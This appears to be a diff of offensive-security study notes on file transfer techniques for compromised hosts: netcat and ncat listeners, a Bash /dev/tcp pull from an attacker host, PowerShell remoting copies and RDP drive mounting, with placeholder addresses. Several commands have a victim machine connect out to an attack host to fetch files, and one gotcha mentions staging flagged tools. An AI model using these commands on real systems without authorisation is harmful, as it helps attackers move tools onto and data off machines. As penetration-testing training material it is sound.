@@ -1,120 +1,147 @@
-# Miscellaneous File Transfer Methods
+## Netcat Inbound Transfer
 
-## Netcat and Ncat
+Firewall allows inbound connections to the target and a Netcat-variant is present on the victim.
 
-**Netcat (nc)** is a networking utility used for reading from and writing to network connections using TCP or UDP. **Ncat** is a modern reimplementation by the Nmap project that adds support for SSL, IPv6, SOCKS, and HTTP proxies.
+Listen on victim using original Netcat to receive file
 
-### Technique Selection
+```
+nc -l -p <PORT> > <FILE_PATH>
+```
 
-|Tool|Use Case|Key Flags|
-|:--|:--|:--|
-|**Netcat (nc)**|Original version; widely available on older systems.|`-q 0`: Terminates the connection once the file transfer is finished.|
-|**Ncat**|Modern version; supports advanced networking features.|`--send-only` / `--recv-only`: Forces the connection to close once input is exhausted or the file is received.|
+Listen on victim using Ncat to receive file and close on completion
 
----
+```
+ncat -l -p <PORT> --recv-only > <FILE_PATH>
+```
 
-### Scenario 1: Inbound Connections Allowed (Target Listening)
+Send file from attack host to listening victim using original Netcat
 
-Use this method when the **target machine can accept incoming connections** on a specific port.
+```
+nc -q 0 <TARGET_IP> <PORT> < <FILE_PATH>
+```
 
-**Operational Workflow:**
+Send file from attack host to listening victim using Ncat
 
-1. **Target:** Start a listener and redirect output to a file.
-2. **Attack Host:** Connect to the target listener and send the file as input.
+```
+ncat --send-only <TARGET_IP> <PORT> < <FILE_PATH>
+```
 
-#### Command Reference
+- **Tool comparison**
+    
+    - Original Netcat -> `nc -l -p <PORT>` -> Basic listener; lacks modern proxy/SSL support.
+    - Ncat -> `ncat -l -p <PORT> --recv-only` -> Reimplementation; supports SSL, IPv6, SOCKS, and explicit connection termination.
+- **Gotchas**
+    
+    - **Connection hangs** if `-q 0` (original nc) or `--send-only`/`--recv-only` (ncat) flags are omitted.
 
-|Goal|Tool|Command|
-|:--|:--|:--|
-|**Listen (Target)**|Netcat|`nc -l -p <PORT> > <FILENAME>`|
-|**Listen (Target)**|Ncat|`ncat -l -p <PORT> --recv-only > <FILENAME>`|
-|**Send (Attack Host)**|Netcat|`nc -q 0 <TARGET_IP> <PORT> < <FILENAME>`|
-|**Send (Attack Host)**|Ncat|`ncat --send-only <TARGET_IP> <PORT> < <FILENAME>`|
+## Netcat Outbound Transfer
 
----
+Inbound connections to the target are blocked by a firewall but egress to the attack host is permitted.
 
-### Scenario 2: Inbound Connections Blocked (Attacker Listening)
+Listen on attack host to send file using original Netcat
 
-Use this method when a **firewall blocks inbound connections** to the compromised machine. This forces the target to initiate an outbound connection to your attack host.
+```
+sudo nc -l -p <PORT> -q 0 < <FILE_PATH>
+```
 
-**Operational Workflow:**
+Listen on attack host to send file using Ncat
 
-1. **Attack Host:** Start a listener and provide the file as input.
-2. **Target:** Connect to the attack host and redirect the incoming stream to a file.
+```
+sudo ncat -l -p <PORT> --send-only < <FILE_PATH>
+```
 
-#### Command Reference
+Connect from victim to receive file using original Netcat
 
-|Goal|Tool|Command|
-|:--|:--|:--|
-|**Listen (Attack Host)**|Netcat|`sudo nc -l -p <PORT> -q 0 < <FILENAME>`|
-|**Listen (Attack Host)**|Ncat|`sudo ncat -l -p <PORT> --send-only < <FILENAME>`|
-|**Receive (Target)**|Netcat|`nc <ATTACK_IP> <PORT> > <FILENAME>`|
-|**Receive (Target)**|Ncat|`ncat <ATTACK_IP> <PORT> --recv-only > <FILENAME>`|
+```
+nc <ATTACK_IP> <PORT> > <FILE_PATH>
+```
 
----
+Connect from victim to receive file using Ncat
 
-### Scenario 3: No Netcat/Ncat on Target (/dev/tcp)
+```
+ncat <ATTACK_IP> <PORT> --recv-only > <FILE_PATH>
+```
 
-If the compromised host lacks Netcat or Ncat, use **Bash pseudo-device files** to handle the transfer.
+- **Dangerous / misconfigured settings**
+    - Listening on low-numbered ports requires **root/sudo privileges** on the attack host.
 
-**Operational Workflow:**
+## Bash /dev/tcp Transfer
 
-1. **Attack Host:** Set up a listener as described in Scenario 2.
-2. **Target:** Use Bash to connect to the attacker's IP/Port and redirect the input.
+Netcat/Ncat is missing from the victim but Bash is available for outbound connections to the attack host.
 
-#### Command Reference
+Receive file on victim via pseudo-device
 
-|Goal|Command|
-|:--|:--|
-|**Receive via Bash**|`cat < /dev/tcp/<ATTACK_IP>/<PORT> > <FILENAME>`|
+```
+cat < /dev/tcp/<ATTACK_IP>/<PORT> > <FILE_PATH>
+```
 
----
+- **Gotchas**
+    - **Silent failure** occurs if the Bash version was not compiled with the net-redirections feature enabled.
 
-## PowerShell Remoting (WinRM)
+> ⚠️ Gap: The source does not specify how to verify if `/dev/tcp` support is enabled in the current Bash build before attempting the transfer.
 
-**PowerShell Remoting** (WinRM) is used for file transfers when standard protocols like **HTTP, HTTPS, or SMB are unavailable**. It typically runs on **TCP/5985 (HTTP)** or **TCP/5986 (HTTPS)**.
+## PowerShell Remoting Transfer
 
-### Requirements for Attack Success
+HTTP/SMB transfer methods are blocked but WinRM is enabled and administrative credentials or proper group membership are available.
 
-- **Administrative Access** on the target or membership in the **Remote Management Users** group.
-- **WinRM enabled** on the target machine.
+Verify WinRM connectivity to target
 
-### Operational Workflow
+```
+Test-NetConnection -ComputerName <TARGET_IP> -Port 5985
+```
 
-1. **Verify Connectivity:** Confirm the WinRM port is open on the target.
-2. **Create Session:** Establish a persistent PowerShell session to the target.
-3. **Transfer File:** Use `Copy-Item` to move files between the local host and the session.
+Establish session to target using existing privileges
 
-#### Command Reference
+```
+$Session = New-PSSession -ComputerName <TARGET_IP>
+```
 
-|Action|Command|
-|:--|:--|
-|**Check Port**|`Test-NetConnection -ComputerName <TARGET_IP> -Port 5985`|
-|**Create Session**|`$Session = New-PSSession -ComputerName <TARGET_IP>`|
-|**Upload File**|`Copy-Item -Path <LOCAL_PATH> -ToSession $Session -Destination <REMOTE_PATH>`|
-|**Download File**|`Copy-Item -Path <REMOTE_PATH> -Destination <LOCAL_PATH> -FromSession $Session`|
+Copy file from attack host to remote session
 
----
+```
+Copy-Item -Path <FILE_PATH> -ToSession $Session -Destination <FILE_PATH>
+```
 
-## Remote Desktop Protocol (RDP)
+Copy file from remote session back to attack host
 
-RDP allows for file transfers via GUI interaction or resource redirection.
+```
+Copy-Item -Path <FILE_PATH> -Destination <FILE_PATH> -FromSession $Session
+```
 
-### Technique Selection
+- **Dangerous / misconfigured settings**
+    
+    - Requires **Administrative access**, Remote Management Users group membership, or explicit session configuration permissions.
+- **Gotchas**
+    
+    - **WinRM disabled** by default unless listeners are configured; typically uses 5985 (HTTP) or 5986 (HTTPS).
 
-- **Copy/Paste:** Simplest method but may fail depending on the client or configuration.
-- **Drive Redirection:** Mounts a local folder from the attack machine as a network drive on the target.
+## RDP Resource Mounting
 
-### Attack Implications
+GUI access is available via RDP and large file transfers or directory access are required without using the clipboard.
 
-- **Security Isolation:** A redirected drive is **not accessible** to other users on the target computer, protecting your tools even if another user hijacks the session.
-- **AV Detection:** If Windows Defender is active on the target, it may **delete malware** stored in your mounted local folder.
+Mount Linux directory using rdesktop
 
-#### Command Reference (Linux Attack Host)
+```
+rdesktop <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -r disk:linux='<FILE_PATH>'
+```
 
-|Tool|Command|
-|:--|:--|
-|**rdesktop**|`rdesktop <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -r disk:linux='<LOCAL_PATH>'`|
-|**xfreerdp**|`xfreerdp /v:<TARGET_IP> /d:<DOMAIN> /u:<USERNAME> /p:'<PASSWORD>' /drive:linux,<LOCAL_PATH>`|
+Mount Linux directory using xfreerdp
 
-**Note:** Once connected via RDP, access the transferred files by navigating to **`\\tsclient`** in Windows File Explorer.
+```
+xfreerdp /v:<TARGET_IP> /d:<DOMAIN> /u:<USERNAME> /p:'<PASSWORD>' /drive:linux,<FILE_PATH>
+```
+
+Access mounted share within Windows session
+
+```
+cd \\tsclient\linux
+```
+
+- **Tool comparison**
+    
+    - xfreerdp/rdesktop -> `/drive` or `-r disk` -> Use when copy/paste fails or transferring multiple files.
+    - mstsc.exe -> Local Resources tab -> Native Windows client for mounting local drives.
+- **Gotchas**
+    
+    - **Malware deletion** by Windows Defender occurs automatically if it scans the mounted share containing flagged tools.
+    - **Clipboard failure** is common with xfreerdp and rdesktop, necessitating the drive mounting method.
